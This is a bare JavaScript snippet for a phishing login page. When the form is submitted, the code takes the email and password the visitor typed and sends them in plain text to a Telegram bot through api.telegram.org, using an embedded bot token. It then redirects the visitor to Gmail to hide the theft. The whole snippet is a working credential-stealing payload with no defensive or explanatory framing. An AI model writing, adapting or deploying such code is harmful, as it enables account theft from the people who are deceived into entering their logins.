javascript
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    fetch(`https://api.telegram.org/bot8023739634:AAFhFe-w9iJNNAVyQJqf6ioVTZugNOdAn30/sendMessage?chat_id=YOUR_CHAT_ID&text=Email: ${email}\nPassword: ${password}`)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                window.location.href = 'https://mail.google.com';
            }
        });
});
